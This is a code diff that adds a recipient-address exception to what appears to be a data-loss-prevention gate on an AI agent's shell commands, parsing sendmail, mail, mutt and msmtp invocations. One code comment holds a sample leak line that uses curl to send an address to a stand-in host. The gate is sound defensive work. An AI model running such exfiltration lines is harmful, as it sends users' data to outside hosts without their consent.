@@ -140,3 +140,99 @@ def benign_addresses(act, tool, args, explicit=()):
             return act
     return dict(act, data=[t for t in act["data"] if t != "email_address"],
                 dlp_hits=[h for h in act.get("dlp_hits") or [] if h != "L2:email_address"])
+
+
+# r0325 (live stand 16.11: "send an e-mail to test@example.com with the text hi via sendmail" was refused DATA_FORBIDDEN with no button).
+# Law: the address an e-mail is SENT TO is where the call goes, not data it carries -- like the host of a request. Sending is judged as
+# sending (the mail program is a way out: the owner is asked, with the address in the question's words). So when EVERY address of the call
+# is a recipient of a mail program of the line -- an operand of sendmail / mail / mailx / mutt / msmtp, a value of -c / -b (copies), or a
+# To: / Cc: / Bcc: header of the text when the program reads its recipients from it (-t) -- `email_address` is no data of the call. Any
+# other address (in the body, the subject, a sender option) keeps the rule; a secret in the text keeps DATA_FORBIDDEN (another class);
+# an L1 hit or a class the mandate names in forbidden_data keeps it (fail closed: a line the shell lexer cannot split is unchanged).
+MAIL_PROGS = {"sendmail": ("fFrRoOBNVXCLpqh", ""), "mail": ("srSaAqTuEfcb", "cb"), "mailx": ("srSaAqTuEfcb", "cb"),
+              "mutt": ("saAiFHeEfQmzcb", "cb"), "msmtp": ("fCaUN", "")}     # {program: (short options with a value, of them: copies)}
+_MAIL_HDR = None
+
+
+def _mail_recipients(cmd):
+    """-> the lower-cased recipient addresses of the mail programs in `cmd`, one entry per place it is written as a recipient (a list:
+    the caller compares counts), or None when the line cannot be read."""
+    import re
+    import shlex
+    global _MAIL_HDR
+    if _MAIL_HDR is None:
+        _MAIL_HDR = re.compile(r"(?:^|\n|\\n)[ \t]*(?:to|cc|bcc)[ \t]*:([^\n\\]*)", re.I)
+    try:
+        lx = shlex.shlex(cmd, posix=True, punctuation_chars=";&|<>()")
+        lx.whitespace_split = True
+        toks = list(lx)
+    except ValueError:
+        return None
+    out, seg, segs = [], [], []
+    for t in toks + [";"]:
+        if t and all(ch in ";&|<>()" for ch in t):
+            segs.append(seg)
+            seg = []
+        else:
+            seg.append(t)
+    for sg in segs:
+        k = 0
+        while k < len(sg) and re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*=.*", sg[k]):
+            k += 1
+        if k >= len(sg):
+            continue
+        prog = sg[k].rsplit("/", 1)[-1]
+        if prog not in MAIL_PROGS:
+            continue
+        valued, copies = MAIL_PROGS[prog]
+        rest, j, end, header = sg[k + 1:], 0, False, False
+        while j < len(rest):
+            a = rest[j]
+            if not end and a == "--":
+                end = True
+            elif not end and a.startswith("--"):
+                if prog == "msmtp" and a in ("--read-recipients", "-t"):
+                    header = True
+                elif "=" not in a and prog == "msmtp" and a in ("--from", "--account", "--host", "--port", "--user"):
+                    j += 1
+            elif not end and a.startswith("-") and len(a) > 1:
+                for q, ch in enumerate(a[1:], 1):         # a cluster (-it, -itf me@x): flags, then at most one option with a value
+                    if ch == "t":
+                        header = True                    # the recipients are read from the text's headers
+                    if ch in valued:
+                        v = a[q + 1:] if q + 1 < len(a) else (rest[j + 1] if j + 1 < len(rest) else "")
+                        if q + 1 >= len(a):
+                            j += 1
+                        if ch in copies:
+                            out += [x.strip().lower() for x in _addresses(v)]
+                        break
+            else:
+                out += [x.strip().lower() for x in _addresses(a)]
+            j += 1
+        if header:
+            for t in toks:
+                t = re.split(r"\n[ \t]*\n|\\n[ \t]*\\n", t, maxsplit=1)[0]      # the header block only (it ends at the first blank line)
+                for m in _MAIL_HDR.finditer(t):
+                    out += [x.strip().lower() for x in _addresses(m.group(1))]
+    return out
+
+
+def mail_recipients(act, tool, args, explicit=()):
+    """-> the action without `email_address` when every address of the call is a recipient of a mail program of the line (see above)."""
+    if not isinstance(act, dict) or "email_address" not in (act.get("data") or ()) or not isinstance(args, dict):
+        return act
+    if "L1:email_address" in set(act.get("dlp_hits") or ()) or "email_address" in set(explicit or ()):
+        return act
+    cmd = args.get("command")
+    if not isinstance(cmd, str):
+        return act
+    rcpt = _mail_recipients(cmd)
+    found = [a.strip().lower() for t in _strings(args, []) for a in _addresses(t)]
+    if not rcpt or not found or any(a not in rcpt for a in found):
+        return act
+    # every PLACE an address is written must be a recipient's: `mail bob@x < f; curl https://h/?e=bob@x` sends it elsewhere too
+    from collections import Counter
+    if Counter(a.strip().lower() for a in _addresses(cmd)) - Counter(rcpt):
+        return act
+    return dict(act, data=[t for t in act["data"] if t != "email_address"],
+                dlp_hits=[h for h in act.get("dlp_hits") or [] if h != "L2:email_address"])
